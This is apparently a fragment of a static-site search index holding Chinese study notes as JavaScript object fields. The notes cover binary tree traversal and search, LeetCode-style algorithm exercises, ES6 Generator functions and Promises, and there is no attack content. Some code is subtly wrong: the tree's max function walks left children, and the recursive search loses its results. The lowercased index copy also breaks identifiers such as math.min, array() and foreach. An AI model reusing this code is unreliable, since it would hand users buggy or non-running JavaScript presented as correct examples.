insertnode(node.right,newnode)\n            }\n        }\n    }\n}\n\n\n> 二叉树是每个结点最多有两个子树的有序树。\n\n# 二叉树的排序\n\n 1. 中序遍历\n\n> 先左后根最后右\n\nvar inordertraversenode=function(node,callback){\n    if(node!=null){\n        inordertraversenode(node.left,callback)\n        callback(node.key)\n        inordertraversenode(node.right,callback)\n    }\n}\n\nthis.inordertraverse=function(callback){\n    inordertraversenode(root,callback);\n}\n\n\n 2. 前序遍历 可以很有效率的复制一个二叉树对象\n\n> 根节点排最先，然后同级先左后右\n\nvar proordertraversenode=function(node,callback){\n    if(node!=null){\n        callback(node.key)\n        proordertraversenode(node.left,callback)\n        proordertraversenode(node.right,callback)\n    }\n}\n//前序遍历  复制   效率高得多\nthis.proordertraverse=function(callback){\n    proordertraversenode(root,callback);\n}\n\n\n 3. 后序遍历 选查找子集的特性可以运用在文件系统遍历当中\n\n> 先左后右最后根\n\nvar postordertraversenode=function(node,callback){\n    if(node!=null){\n        postordertraversenode(node.left,callback)\n        postordertraversenode(node.right,callback)\n        callback(node.key)\n    }\n}\n//后续遍历  文件系统遍历\nthis.postordertraverse=function(callback){\n    postordertraversenode(root,callback);\n}\n\n\n 4. 测试：\n\n// 前序遍历\nvar nodes=[8,3,10,1,6,14,4,7,13];\nvar binarytree=new binarytree();\nnodes.foreach(function(key){\n    binarytree.insert(key);\n})\nvar callback=function(key){\n    console.log(key)\n}\nbinarytree.inordertraverse(callback)\n\n\n# 查找\n\n 1. 查找指定值\n\nvar searchnode=function(node,key){\n    if(node==null){\n        return false\n    }\n    if(node.key>key){  //小于当前node往左找\n        searchnode(node.left,key)\n    }else if(node.key<key){ //大于当前node往右找\n        searchnode(node.right,key)\n    }else{ // 找到\n        return true;\n    }\n}\nthis.search=function(key){\n    return searchnode(root,key)\n}\n\n\n 2. 查找最值\n\n// 最大值\nvar maxnode=function(node){\n    if(node){\n        while(node&&node.right!=null){\n            node=node.left\n        }\n        return node.key;\n    }\n}\nthis.max=function(){\n    return maxnode(root)\n}\n// 最小值\nvar minnode=function(node){\n    if(node){\n        while(node&&node.left!=null){\n            node=node.left\n        }\n\n        return node.key;\n    }\n}\nthis.min=function(){\n    return minnode(root)\n}\n\n\n\n# 计算式查找法————哈希法\n\n根据关键字（key)而直接访问在内存储存位置\n\n\n# 简单算法题\n\n * 给定一个包含非负整数的mxn网格，请找出一条从左上角到右下角的路径，使得路径上的数字总和为最小。\n   说明：每次只能向下或者向右移动一步。\n   输入: [ [1,3,1], [1,5,1], [4,2,1] ] 输出: 7 解释: 因为路径 1→3→1→1→1 的总和最小。\n\nvar minpathsum = function(grid) {  \n    var n = grid.length\n    if(n == 0) return 0\n    for(let i = 0; i < n; i++){\n        for(let j = 0; j < grid[i].length; j++){              \n            if(!i && !j) continue\n            grid[i][j] = math.min((i ? grid[i - 1][j] : number.max_value),(j ? grid[i][j - 1] : number.max_value)) + grid[i][j]\n        }\n    }\n    return grid[n - 1][grid[0].length - 1]\n};\n\n\n * 给定一个由整数组成的非空数组所表示的非负整数，在该数的基础上加一。\n   最高位数字存放在数组的首位， 数组中每个元素只存储一个数字。\n   你可以假设除了整数 0 之外，这个整数不会以零开头。\n * 假设你正在爬楼梯。需要 n 阶你才能到达楼顶。 每次你可以爬 1 或 2 个台阶。你有多少种不同的方法可以爬到楼顶呢？ 注意：给定 n 是一个正整数。\n\n示例 1：\n\n输入： 2\n输出： 2\n解释： 有两种方法可以爬到楼顶。\n1.  1 阶 + 1 阶\n2.  2 阶\n示例 2：\n\n输入： 3\n输出： 3\n解释： 有三种方法可以爬到楼顶。\n1.  1 阶 + 1 阶 + 1 阶\n2.  1 阶 + 2 阶\n3.  2 阶 + 1 阶\n\n\n * 给定一个 m x n 的矩阵，如果一个元素为 0，则将其所在行和列的所有元素都设为 0。\n\n输入:\n[\n  [1,1,1],\n  [1,0,1],\n  [1,1,1]\n]\n输出:\n[\n  [1,0,1],\n  [0,0,0],\n  [1,0,1]\n]\n\n\nvar setzeroes = function(matrix) {\n    const cached = [];\n    const a = matrix.length;\n    const b = matrix[0].length;\n\n    for (const i of matrix.keys()) {\n        for (const j of matrix[i].keys()) {\n            if(matrix[i][j] === 0) {\n                cached.push(\n                        ...array(b).fill().map((_, k) => [i, k]),\n                        ...array(a).fill().map((_, k) => [k, j]),\n                );\n            }\n        }\n    }\n\n    for (const [x, y] of cached) {\n        matrix[x][y] = 0;\n    }\n\n    return matrix;\n};\n\n\n * 给定两个整数 n 和 k，返回 1 ... n 中所有可能的 k 个数的组合。\n\n输入: n = 4, k = 2\n输出:\n[\n  [2,4],\n  [3,4],\n  [2,3],\n  [1,2],\n  [1,3],\n  [1,4],\n]\n\n\nvar combine = function(n, k) {\n    const arr = array(n).fill().map((_,index) => index + 1);\n    const buffer = [];\n    const result = [];\n\n    const backtrace = (index, target) => {\n        if(target == 0) {\n            return result.push(buffer.slice());\n        }\n\n        if(index === arr.length) return;\n\n        buffer.push(arr[index]);\n        backtrace(index + 1, target - 1);\n        buffer.pop();\n\n        backtrace(index + 1, target);\n    }\n    backtrace(0, k);\n\n    return result;\n};\n\n\n * 给定一个包括 n 个整数的数组 nums 和 一个目标值 target。找出 nums 中的三个整数，使得它们的和与 target 最接近。返回这三个数的和。假定每组输入只存在唯一答案。\n\n例如，给定数组 nums = [-1，2，1，-4], 和 target = 1.\n与 target 最接近的三个数的和为 2. (-1 + 2 + 1 = 2).\n\n\nvar threesumclosest = function(nums, target) {\n    nums.sort(function(a, b) {\n        return a - b\n    })\n    let res = nums[0] + nums[1] + nums[2]\n    let cur = 0\n    let diff = math.abs(nums[0] + nums[1] + nums[2] -target)\n    for(let i=0;i<nums.length - 2; i++) {\n        let j = i + 1\n        let k = nums.length - 1\n        while(j<k) {\n\t    cur = nums[i] + nums[j] + nums[k]\n            if(math.abs(cur - target) < diff) {\n                diff = math.abs(cur - target)\n                res = cur\n            }\n            if(cur < target) {\n                j++\n            } else {\n                k--\n            }\n        }\n    }\n    return res\n};\n\n\n * 给定一个仅包含 0 和 1 的二维二进制矩阵，找出只包含 1 的最大矩形，并返回其面积。\n\n输入:\n[\n  ["1","0","1","0","0"],\n  ["1","0","1","1","1"],\n  ["1","1","1","1","1"],\n  ["1","0","0","1","0"]\n]\n输出: 6\n\n\n * 小偷又发现了一个新的可行窃的地区。这个地区只有一个入口，我们称之为“根”。 除了“根”之外，每栋房子有且只有一个“父“房子与之相连。一番侦察之后，聪明的小偷意识到“这个地方的所有房屋的排列类似于一棵二叉树”。 如果两个直接相连的房子在同一天晚上被打劫，房屋将自动报警。\n   计算在不触动警报的情况下，小偷一晚能够盗取的最高金额。\n\n输入: [3,4,5,1,3,null,1]\n     3\n    / \\\n   4   5\n  / \\   \\\n 1   3   1\n输出: 9\n解释: 小偷一晚能够盗取的最高金额 = 4 + 5 = 9.\n输入: [3,2,3,null,3,null,1]\n     3\n    / \\\n   2   3\n    \\   \\\n     3   1\n输出: 7\n解释: 小偷一晚能够盗取的最高金额 = 3 + 3 + 1 = 7.\n\n\n * 给定一个赎金信 (ransom) 字符串和一个杂志(magazine)字符串，判断第一个字符串ransom能不能由第二个字符串magazines里面的字符构成。如果可以构成，返回 true ；否则返回 false。\n   (题目说明：为了不暴露赎金信字迹，要从杂志上搜索各个需要的字母，组成单词来表达意思。)\n\n你可以假设两个字符串均只含有小写字母。\ncanconstruct("a", "b") -> false\ncanconstruct("aa", "ab") -> false\ncanconstruct("aa", "aab") -> true\n\n\n * 使用栈实现队列的下列操作：\n   push(x) -- 将一个元素放入队列的尾部。\n   pop() -- 从队列首部移除元素。\n   peek() -- 返回队列首部的元素。\n   empty() -- 返回队列是否为空。\n\nmyqueue queue = new myqueue();\n\nqueue.push(1);\nqueue.push(2);  \nqueue.peek();  // 返回 1\nqueue.pop();   // 返回 1\nqueue.empty(); // 返回 false\n\n\n/**\n * initialize your data structure here.\n */\nvar myqueue = function() {\n    this.input = []\n    this.output = []\n    this.size = 0\n};\n\n/**\n * push element x to the back of queue.\n * @param {number} x\n * @return {void}\n */\nmyqueue.prototype.push = function(x) {\n    this.input.push(x)\n    this.size += 1\n};\n\n/**\n * removes the element from in front of queue and returns that element.\n * @return {number}\n */\nmyqueue.prototype.pop = function() {\n    if(this.output.length === 0) {\n      for(var i = 0; i < this.size; i++) {\n        this.output[this.size-i-1] = this.input[i]\n      }   \n      this.size = 0\n      this.input = []\n    }\n    return this.output.pop()\n};\n\n/**\n * get the front element.\n * @return {number}\n */\nmyqueue.prototype.peek = function() {\n    if(this.output.length === 0) {\n      for(var i = 0; i < this.size; i++) {\n        this.output[this.size-i-1] = this.input[i]\n      }   \n      this.size = 0\n      this.input = []\n    }\n    return this.output[this.output.length - 1]\n};\n\n/**\n * returns whether the queue is empty.\n * @return {boolean}\n */\nmyqueue.prototype.empty = function() {\n    return (this.output.length===0&&this.size===0)\n};\n\n/**\n * your myqueue object will be instantiated and called as such:\n * var obj = object.create(myqueue).createnew()\n * obj.push(x)\n * var param_2 = obj.pop()\n * var param_3 = obj.peek()\n * var param_4 = obj.empty()\n */\n\n\n * 给定一个非负索引 k，其中 k ≤ 33，返回杨辉三角的第 k 行。\n   在杨辉三角中，每个数是它左上方和右上方的数的和。\n\n输入: 3\n输出: [1,3,3,1]\n\n\nvar getrow = function(numrows) {\n    if (numrows === 0) return [1];\n\n    const result = [[1]];\n\n    for (let index = 1; index < numrows + 1; index++) {\n        const last = result[result.length - 1];\n        result.push(array(index + 1).fill(1).map((_, ind) => (last[ind] || 0) + (last[ind - 1] || 0)))\n    }\n\n    return result[numrows];\n};\n\n\n * 优势洗牌 (田忌赛马) 给定两个大小相等的数组 a 和 b，a 相对于 b 的优势可以用满足 a[i] > b[i]的索引i的数目来描述。\n   返回 a 的任意排列，使其相对于 b 的优势最大化。\n\n输入：a = [2,7,11,15], b = [1,10,4,11]\n输出：[2,11,7,15]  \n\n输入：a = [12,24,8,32], b = [13,25,32,11]\n输出：[24,32,8,12]\n\n\nvar advantagecount = function(a, b) {\n    var arr = [];\n    a.sort(function(a, b) {\n        return a - b;\n              });\n    b.foreach(function(item) {\n        var index = a.findindex(function(_item) {\n            return _item > item;\n        });\n    if (index > -1) {\n        arr.push(a.splice(index, 1)[0]);\n        } else  {\n            arr.push(a.splice(0, 1)[0]);\n        } });\n    return arr;\n};\n\n\n * 给定两个二叉树，编写一个函数来检验它们是否相同。 如果两个树在结构上相同，并且节点具有相同的值，则认为它们是相同的。\n\n输入:       1         1\n          / \\       / \\\n         2   3     2   3\n\n        [1,2,3],   [1,2,3]\n\n输出: true\n\n输入:      1          1\n          /           \\\n         2             2\n\n        [1,2],     [1,null,2]\n\n输出: false\n\n输入:       1         1\n          / \\       / \\\n         2   1     1   2\n\n        [1,2,1],   [1,1,2]\n\n输出: false\n\n\nvar issametree = function(p, q) {\n    const queue = [[p, q]];\n    while(queue.length) {\n        const [cp, cq] = queue.shift();\n        if(!cp && !cq) continue;\n        if(!cp && cq || cp && !cq) {\n            return false;\n        }\n        if(cp.val !== cq.val) {\n            return false;\n        }\n        queue.push([cp.left, cq.left], [cp.right, cq.right])\n    }\n    return true;\n};\n\n\n * 给定一个二叉树，判断其是否是一个有效的二叉搜索树。\n   假设一个二叉搜索树具有如下特征：\n   节点的左子树只包含小于当前节点的数。\n   节点的右子树只包含大于当前节点的数。\n   所有左子树和右子树自身必须也是二叉搜索树。\n\n输入:\n    2\n   / \\\n  1   3\n输出: true\n\n输入:\n    5\n   / \\\n  1   4\n     / \\\n    3   6\n输出: false\n解释: 输入为: [5,1,4,null,null,3,6]。\n     根节点的值为 5 ，但是其右子节点值为 4 。\n\n\nvar inordertraversal = function(root) {\n    const result = [];\n    const inorder = node => {\n        if(!node) return;\n        inorder(node.left);\n        result.push(node.val);\n        inorder(node.right);\n    }\n    inorder(root);\n    return result;\n};\n\nvar isvalidbst = function(root) {\n    const arr = inordertraversal(root);\n    return arr.every((item, index) => item > (index > 0 ? arr[index - 1] : -infinity));\n};\n\n\n * 给定一个整数 n，求以 1 ... n 为节点组成的二叉搜索树有多少种？\n\n输入: 3\n输出: 5\n解释:\n给定 n = 3, 一共有 5 种不同结构的二叉搜索树:\n\n   1         3     3      2      1\n    \\       /     /      / \\      \\\n     3     2     1      1   3      2\n    /     /       \\                 \\\n   2     1         2                 3\n',charsets:{cjk:!0}},{title:"Generator 函数",frontmatter:{},regularPath:"/Javascript/Javascript%E6%95%B0%E6%8D%AE%E5%A4%84%E7%90%86/Generator%E5%87%BD%E6%95%B0.html",relativePath:"Javascript/Javascript数据处理/Generator函数.md",key:"v-6990fdee",path:"/Javascript/Javascript%E6%95%B0%E6%8D%AE%E5%A4%84%E7%90%86/Generator%E5%87%BD%E6%95%B0.html",headers:[{level:2,title:"简介",slug:"简介",normalizedTitle:"简介",charIndex:19},{level:3,title:"基本概念",slug:"基本概念",normalizedTitle:"基本概念",charIndex:26},{level:3,title:"Generator函数语法",slug:"generator函数语法",normalizedTitle:"generator函数语法",charIndex:239},{level:3,title:"Generator 函数的调用",slug:"generator-函数的调用",normalizedTitle:"generator 函数的调用",charIndex:486},{level:2,title:"yield 表达式",slug:"yield-表达式",normalizedTitle:"yield 表达式",charIndex:1418}],headersStr:"简介 基本概念 Generator函数语法 Generator 函数的调用 yield 表达式",content:"# Generator 函数\n\n\n# 简介\n\n\n# 基本概念\n\nGenerator函数是ES6提供的一种异步编程解决方案，语法行为与传统函数完全不同。\n\nGenerator函数有多种理解角度。语法上，首先可以把它理解成Generator函数是一个状态机，封装了多个内部状态。\n\n执行Generator函数会返回一个遍历器对象，也就是说，Generator函数除了状态机，还是一个遍历器对象生成函数。返回的遍历器对象，可以依次遍历Generator函数内部的每一个状态。\n\n\n# Generator函数语法\n\n形式上，Generator函数是一个普通函数，但是有两个特征。一是，function关键字与函数名之间有一个星号；二是,函数体内部使用yield表达式，定义不同的内部状态(yield在英语里的意思就是'产出')。\n\nfunction* helloGenerator(){\n    yield 'hello';\n    yield 'world';\n    return 'ending';\n}\nvar hello = helloGenerator();\n\n\n\n# Generator 函数的调用\n\nGenerator 函数的调用方法与普通函数一样，也是在函数名后面加上一对圆括号。不同的是，调用 Generator 函数后，该函数并不执行，返回的也不是函数运行结果，而是一个指向内部状态的指针对象，也就是上一章介绍的遍历器对象（Iterator Object）。\n\n接下来，必须调用遍历器对象的next方法，使得指针移向下一个状态。也就是说，每次调用next方法，内部指针就从函数头部或上一次停下来的地方开始执行，直到遇到下一个yield表达式（或return语句）为止。换言之，Generator 函数是分段执行的，yield表达式是暂停执行的标记，而next方法可以恢复执行。\n\nvar hello = helloGenerator();\nhello.next()\n// { value: 'hello', done: false }\n\nhello.next()\n// { value: 'world', done: false }\n\nhello.next()\n// { value: 'ending', done: true }\n\nhello.next()\n// { value: undefined, done: true }\n\n\n调用 Generator 函数，返回一个遍历器对象，代表 Generator 函数的内部指针。以后，每次调用遍历器对象的next方法，就会返回一个有着value和done两个属性的对象。value属性表示当前的内部状态的值，是yield表达式后面那个表达式的值；done属性是一个布尔值，表示是否遍历结束。\n\nES6 没有规定，function关键字与函数名之间的星号，写在哪个位置。这导致下面的写法都能通过。\n\nfunction * foo(x, y) { ··· }\nfunction *foo(x, y) { ··· }\nfunction* foo(x, y) { ··· }\nfunction*foo(x, y) { ··· }\n\n\n由于 Generator 函数仍然是普通函数，所以一般的写法是上面的第三种，即星号紧跟在function关键字后面。本书也采用这种写法。\n\n\n# yield 表达式\n\n由于Generator函数返回的遍历器对象，只有调用next方法才会遍历下一个内部状态，所以其实提供了一种可以暂停执行的函数。yield表达式就是暂停标志。\n\n遍历器对象的next方法的运行逻辑如下。\n\n 1. 遇到yield表达式，就暂停执行后面的操作，并将紧跟在yield后面的那个表达式的值，作为返回的对象的value属性值。\n\n * 下一次调用next方法时，再继续往下执行，直到遇到下一个yield表达式。\n * 如果没有再遇到新的yield表达式，就一直运行到函数结束，直到return语句为止，并将return语句后面的表达式的值，作为返回的对象的value属性值。\n * 如果该函数没有return语句，则返回的对象的value属性值为undefined。\n\n需要注意的是，yield表达式后面的表达式，只有当调用next方法、内部指针指向该语句时才会执行，因此等于为 JavaScript 提供了手动的“惰性求值”（Lazy Evaluation）的语法功能。\n\nfunction* gen() {\n  yield  123 + 456;\n}\n\n\n上面代码中，yield后面的表达式123 + 456，不会立即求值，只会在next方法将指针移到这一句时，才会求值。\n\nyield表达式与return语句既有相似之处，也有区别。相似之处在于，都能返回紧跟在语句后面的那个表达式的值",normalizedContent:"# generator 函数\n\n\n# 简介\n\n\n# 基本概念\n\ngenerator函数是es6提供的一种异步编程解决方案，语法行为与传统函数完全不同。\n\ngenerator函数有多种理解角度。语法上，首先可以把它理解成generator函数是一个状态机，封装了多个内部状态。\n\n执行generator函数会返回一个遍历器对象，也就是说，generator函数除了状态机，还是一个遍历器对象生成函数。返回的遍历器对象，可以依次遍历generator函数内部的每一个状态。\n\n\n# generator函数语法\n\n形式上，generator函数是一个普通函数，但是有两个特征。一是，function关键字与函数名之间有一个星号；二是,函数体内部使用yield表达式，定义不同的内部状态(yield在英语里的意思就是'产出')。\n\nfunction* hellogenerator(){\n    yield 'hello';\n    yield 'world';\n    return 'ending';\n}\nvar hello = hellogenerator();\n\n\n\n# generator 函数的调用\n\ngenerator 函数的调用方法与普通函数一样，也是在函数名后面加上一对圆括号。不同的是，调用 generator 函数后，该函数并不执行，返回的也不是函数运行结果，而是一个指向内部状态的指针对象，也就是上一章介绍的遍历器对象（iterator object）。\n\n接下来，必须调用遍历器对象的next方法，使得指针移向下一个状态。也就是说，每次调用next方法，内部指针就从函数头部或上一次停下来的地方开始执行，直到遇到下一个yield表达式（或return语句）为止。换言之，generator 函数是分段执行的，yield表达式是暂停执行的标记，而next方法可以恢复执行。\n\nvar hello = hellogenerator();\nhello.next()\n// { value: 'hello', done: false }\n\nhello.next()\n// { value: 'world', done: false }\n\nhello.next()\n// { value: 'ending', done: true }\n\nhello.next()\n// { value: undefined, done: true }\n\n\n调用 generator 函数，返回一个遍历器对象，代表 generator 函数的内部指针。以后，每次调用遍历器对象的next方法，就会返回一个有着value和done两个属性的对象。value属性表示当前的内部状态的值，是yield表达式后面那个表达式的值；done属性是一个布尔值，表示是否遍历结束。\n\nes6 没有规定，function关键字与函数名之间的星号，写在哪个位置。这导致下面的写法都能通过。\n\nfunction * foo(x, y) { ··· }\nfunction *foo(x, y) { ··· }\nfunction* foo(x, y) { ··· }\nfunction*foo(x, y) { ··· }\n\n\n由于 generator 函数仍然是普通函数，所以一般的写法是上面的第三种，即星号紧跟在function关键字后面。本书也采用这种写法。\n\n\n# yield 表达式\n\n由于generator函数返回的遍历器对象，只有调用next方法才会遍历下一个内部状态，所以其实提供了一种可以暂停执行的函数。yield表达式就是暂停标志。\n\n遍历器对象的next方法的运行逻辑如下。\n\n 1. 遇到yield表达式，就暂停执行后面的操作，并将紧跟在yield后面的那个表达式的值，作为返回的对象的value属性值。\n\n * 下一次调用next方法时，再继续往下执行，直到遇到下一个yield表达式。\n * 如果没有再遇到新的yield表达式，就一直运行到函数结束，直到return语句为止，并将return语句后面的表达式的值，作为返回的对象的value属性值。\n * 如果该函数没有return语句，则返回的对象的value属性值为undefined。\n\n需要注意的是，yield表达式后面的表达式，只有当调用next方法、内部指针指向该语句时才会执行，因此等于为 javascript 提供了手动的“惰性求值”（lazy evaluation）的语法功能。\n\nfunction* gen() {\n  yield  123 + 456;\n}\n\n\n上面代码中，yield后面的表达式123 + 456，不会立即求值，只会在next方法将指针移到这一句时，才会求值。\n\nyield表达式与return语句既有相似之处，也有区别。相似之处在于，都能返回紧跟在语句后面的那个表达式的值",charsets:{cjk:!0}},{title:"Promise",frontmatter:{},regularPath:"/Javascript/Javascript%E6%95%B0%E6%8D%AE%E5%A4%84%E7%90%86/Promise.html",relativePath:"Javascript/Javascript数据处理/Promise.md",key:"v-5435f4b4",path:"/Javascript/Javascript%E6%95%B0%E6%8D%AE%E5%A4%84%E7%90%86/Promise.html",headers:[{level:2,title:"使用场景",slug:"使用场景",normalizedTitle:"使用场景",charIndex:196},{level:2,title:"兼容性",slug:"兼容性",normalizedTitle:"兼容性",charIndex:970},{level:2,title:"Promise 函数内部状态",slug:"promise-函数内部状态",normalizedTitle:"promise 函数内部状态",charIndex:1261},{level:2,title:"注意事项",slug:"注意事项",normalizedTitle:"注意事项",charIndex:1486},{level:2,title:"缺点",slug:"缺点",normalizedTitle:"缺点",charIndex:1876},{level:2,title:"使用",slug:"使用",normalizedTitle:"使用",charIndex:196},{level:2,title:"Promise 对象方法",slug:"promise-对象方法",normalizedTitle:"promise 对象方法",charIndex:3193},{level:2,title:"then 方法：",slug:"then-方法",normalizedTitle:"then 方法：",charIndex:3210},{level:2,title:"catch 方法：",slug:"catch-方法",normalizedTitle:"catch 方法：",charIndex:3249},{level:2,title:"finally 方法：",slug:"finally-方法",normalizedTitle:"finally 方法：",charIndex:3294},{level:2,title:"Promise.all 方法",slug:"promise-all-方法",normalizedTitle:"promise.all 方法",charIndex:3334},{level:2,title:"Promise.race 方法",slug:"promise-race-方法",normalizedTitle:"promise.race 方法",charIndex:3618},{level:2,title:"Promise.resolve 方法",slug:"promise-resolve-方法",normalizedTitle:"promise.resolve 方法",charIndex:3785}],headersStr:"使用场景 兼容性 Promise 函数内部状态 注意事项 缺点 使用 Promise 对象方法 then 方法： catch 方法： finally 方法： Promise.all 方法 Promise.race 方法 Promise.resolve 方法",content:'# Promise\n\nPromise是最早由社区提出和实现的一种解决异步编程的方案，比其他传统的解决方案（回调函数和事件）更合理和更强大。\n\n所谓promise，简单说是一个容器，里面保存着某个未来才会结束的事件（通常是一个异步操作）的结果，从语法上说，promise是一个对象，从它可以获取异步操作的消息，promise提供了统一的API，各种异步操作都可以用同样的方法进行处理。\n\n\n# 使用场景\n\n执行代码的时候，下次执行的代码需要依赖上次代码执行的结果，只能将第二次的代码放到第一次代码执行成功之后的回调函数中，导致回调函数的多次嵌套\n\n例如当进行ajax请求时，下次ajax请求需要依赖上次请求的结果，只能将第二次的ajax请求放在第一次的success函数中，容器嵌套过多\n\najax({\n    url: "1.txt",\n    success(res) {\n        // 第一个ajax结束\n        var str1 = res\n        ajax({\n            url: "2.txt",\n            success(res) {\n                // 第二个ajax结束\n                var str2 = res\n                ajax({\n                    url: "3.txt",\n                    success(res) {\n                        // 第三个ajax结束\n                        var str3 = res\n\n                        console.log(str1 + str2 + str3)\n                    }\n                })\n            }\n        })\n    }\n})\n\n\nPromise 是 ES6 原生支持的，他把原来嵌套的回调改为了级联的方式。\n\nPromise 主要就是为了解决异步回调的问题。用 Promise 来处理异步回调使得代码层次清晰，便于理解，且更加容易维护。\n\n\n# 兼容性\n\nPromise 是 ES6 原生支持的, Promise是新特性，在IE9-11中不支持\n\n通过 CDN 引入es6-promise.auto.js即可在ie中使用Promise：\n<script src="https://cdn.jsdelivr.net/npm/es6-promise@4/dist/es6-promise.auto.js"><\/script>\n\nNPM\n如果使用 npm 包管理器，可以按照下列方式执行安装：\n\nnpm install es6-promise --save # npm\n\nimport \'es6-promise/auto\'\n\n\n\n# Promise 函数内部状态\n\n 1. pending 进行中\n 2. resolved 已完成 ( fulfilled )\n 3. rejected 失败\n\n> Promise 对象，如果该对象状态变为resolved，则会调用then方法指定的回调函数；如果异步操作抛出错误，状态就会变为rejected，就会调用catch方法指定的回调函数，处理这个错误。另外，then方法指定的回调函数，如果运行中抛出错误，也会被catch方法捕获\n\n\n# 注意事项\n\n 1. reject方法的作用，等同于抛出错误。\n 2. 如果 Promise 状态已经变成resolved，再抛出错误是无效的。因为 Promise 的状态一旦改变，就永久保持该状态，不会再变了。\n 3. Promise 对象的错误具有“冒泡”性质，会一直向后传递，直到被捕获为止。也就是说，错误总是会被下一个catch语句捕获。\n 4. then可以接收两个参数，成功和失败。 但是失败只能捕获本次的错误\n 5. Promise 对象后面要跟catch方法，这样可以处理 Promise 内部发生的错误，Promise可以“吃掉”错误\n 6. catch方法返回的还是一个 Promise 对象，因此后面还可以接着调用then方法。代码运行完catch方法指定的回调函数，会接着运行后面那个then方法指定的回调函数。如果没有报错，则会跳过catch方法\n\n\n# 缺点\n\n * 无法取消Promise，一旦新建它就会立即执行，无法中途取消。\n * 其次，如果不设置回调函数，Promise内部抛出的错误，不会反应到外部。\n * 第三，当处于pending状态时，无法得知目前进展到哪一个阶段（刚刚开始还是即将完成）。\n\n\n# 使用\n\n- Promise 构造函数接受一个函数作为参数，该函数的两个参数分别是 resolve 和 reject 。它们是两个函数，由 JavaScript 引擎提供，不用自己部署。 resolve 函数的作用是，将 Promise 对象的状态从“未完成”变为“成功”（即从 pending 变为 resolved ），在异步操作成功时调用，并将异步操作的结果，作为参数传递出去；\n\nreject 函数的作用是，将 Promise 对象的状态从“未完成”变为“失败”（即从 pending 变为 rejected ），在异步操作失败时调用，并将异步操作报出的错误，作为参数传递出去。\n\nconst promise = new Promise(function(resolve, reject) {\n    // ... some code\n\n    if ( /* 异步操作成功 */ ) {\n        resolve(value);\n    } else {\n        reject(error);\n    }\n});\n\n\n- Promise 实例生成以后，可以用 then 方法分别指定 resolved 状态和 rejected 状态的回调函数。\n\npromise.then(function(value) {\n    // resolved时调用\n    // success\n}, function(error) {\n    // rejected时调用\n    // failure\n});\n\n\nnew Promise(function(resolve, reject) {\n\n        // resolve :函数执行成功调用，  调用之后会执行 then 方法\n        // reject ：当函数出现错误，  调用之后会执行 catch 方法\n\n        resolve(data)\n\n    })\n    .then(function(data) {\n        // data 可接收上次resolve发送的数据\n        return new Promise(function(resolve, reject) {\n            resolve(data2)\n        })\n    })\n    .then(function(data2) {\n        //data2 接收上次return的数据\n    })\n    .catch(function() {\n        // 当请求出错时，会触发catch方法\n    })\n    .finally(function() {\n        // 无论函数执行结果如何都会执行 finally函数\n    })\n\n\n\n# Promise 对象方法\n\n\n# then 方法：\n\nPromise异步函数结束之后，调用then方法\n\n\n# catch 方法：\n\n当Promise 异步函数 出现错误，会调用catch方法\n\n\n# finally 方法：\n\n无论成功 失败都会执行 finally 方法\n\n\n# Promise.all 方法\n\n可以将多个Promise对象包装成一个新的 Promise 实例。 (并行)\n\n * Promise.all方法接受一个数组作为参数，参数必须都是 Promise 对象\n * 只有 参数 的状态都变成fulfilled，Promise.all 对象的结果才为fulfilled\n * Promise.all 对象可以接收每个 参数的返回值\n\nPromise.all([p1, p2]).then(([end1, end2]) => {\n    console.log("全部已完成")\n}).catch(() => {});\n\n\n\n# Promise.race 方法\n\n可以将多个Promise对象包装成一个新的 Promise 实例。\n\n * Promise.race方法接受一个数组作为参数，参数必须都是 Promise 对象\n * 只要参数之中有一个实例率先改变状态，p的状态就跟着改变。那个率先改变的 Promise 实例的返回值，就传递给p的回调函数\n\n\n# Promise.resolve 方法\n\n将任意数据变为变为 Promise 对象，如果其已经时Promise对象，则无任何操作。',normalizedContent:'# promise\n\npromise是最早由社区提出和实现的一种解决异步编程的方案，比其他传统的解决方案（回调函数和事件）更合理和更强大。\n\n所谓promise，简单说是一个容器，里面保存着某个未来才会结束的事件（通常是一个异步操作）的结果，从语法上说，promise是一个对象，从它可以获取异步操作的消息，promise提供了统一的api，各种异步操作都可以用同样的方法进行处理。\n\n\n# 使用场景\n\n执行代码的时候，下次执行的代码需要依赖上次代码执行的结果，只能将第二次的代码放到第一次代码执行成功之后的回调函数中，导致回调函数的多次嵌套\n\n例如当进行ajax请求时，下次ajax请求需要依赖上次请求的结果，只能将第二次的ajax请求放在第一次的success函数中，容器嵌套过多\n\najax({\n    url: "1.txt",\n    success(res) {\n        // 第一个ajax结束\n        var str1 = res\n        ajax({\n            url: "2.txt",\n            success(res) {\n                // 第二个ajax结束\n                var str2 = res\n                ajax({\n                    url: "3.txt",\n                    success(res) {\n                        // 第三个ajax结束\n                        var str3 = res\n\n                        console.log(str1 + str2 + str3)\n                    }\n                })\n            }\n        })\n    }\n})\n\n\npromise 是 es6 原生支持的，他把原来嵌套的回调改为了级联的方式。\n\npromise 主要就是为了解决异步回调的问题。用 promise 来处理异步回调使得代码层次清晰，便于理解，且更加容易维护。\n\n\n# 兼容性\n\npromise 是 es6 原生支持的, promise是新特性，在ie9-11中不支持\n\n通过 cdn 引入es6-promise.auto.js即可在ie中使用promise：\n<script src="https://cdn.jsdelivr.net/npm/es6-promise@4/dist/es6-promise.auto.js"><\/script>\n\nnpm\n如果使用 npm 包管理器，可以按照下列方式执行安装：\n\nnpm install es6-promise --save # npm\n\nimport \'es6-promise/auto\'\n\n\n\n# promise 函数内部状态\n\n 1. pending 进行中\n 2. resolved 已完成 ( fulfilled )\n 3. rejected 失败\n\n> promise 对象，如果该对象状态变为resolved，则会调用then方法指定的回调函数；如果异步操作抛出错误，状态就会变为rejected，就会调用catch方法指定的回调函数，处理这个错误。另外，then方法指定的回调函数，如果运行中抛出错误，也会被catch方法捕获\n\n\n# 注意事项\n\n 1. reject方法的作用，等同于抛出错误。\n 2. 如果 promise 状态已经变成resolved，再抛出错误是无效的。因为 promise 的状态一旦改变，就永久保持该状态，不会再变了。\n 3. promise 对象的错误具有“冒泡”性质，会一直向后传递，直到被捕获为止。也就是说，错误总是会被下一个catch语句捕获。\n 4. then可以接收两个参数，成功和失败。 但是失败只能捕获本次的错误\n 5. promise 对象后面要跟catch方法，这样可以处理 promise 内部发生的错误，promise可以“吃掉”错误\n 6. catch方法返回的还是一个 promise 对象，因此后面还可以接着调用then方法。代码运行完catch方法指定的回调函数，会接着运行后面那个then方法指定的回调函数。如果没有报错，则会跳过catch方法\n\n\n# 缺点\n\n * 无法取消promise，一旦新建它就会立即执行，无法中途取消。\n * 其次，如果不设置回调函数，promise内部抛出的错误，不会反应到外部。\n * 